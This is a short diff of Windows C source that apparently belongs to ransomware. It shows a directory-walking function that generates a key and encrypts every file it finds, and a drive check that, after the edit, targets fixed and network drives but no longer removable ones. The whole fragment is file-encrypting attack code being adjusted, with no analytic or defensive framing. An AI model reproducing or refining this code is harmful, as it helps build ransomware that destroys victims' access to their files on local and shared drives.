@@ -80,7 +80,7 @@ void finddir(unsigned char * path, unsigned char * mask) {
     strcat(pathfile, slash);
     strcat(pathfile, wfd.cFileName);
     generatekey();
-    fileencrypt(pathfile);
+	fileencrypt(pathfile);
    }
   } while (FindNextFile(hfound, &wfd));
  }
@@ -115,7 +115,7 @@ short int checklogicaldisk(unsigned char number_disk) {
 
  short int result = (short int)GetDriveType(&LOGICAL_DISK[_ZERO]);
  
- if ((result == DRIVE_FIXED) || (result == DRIVE_REMOTE) || (result == DRIVE_REMOVABLE))
+ if ((result == DRIVE_FIXED) || (result == DRIVE_REMOTE))
   return _ZERO;
  else
   return _ERROR;
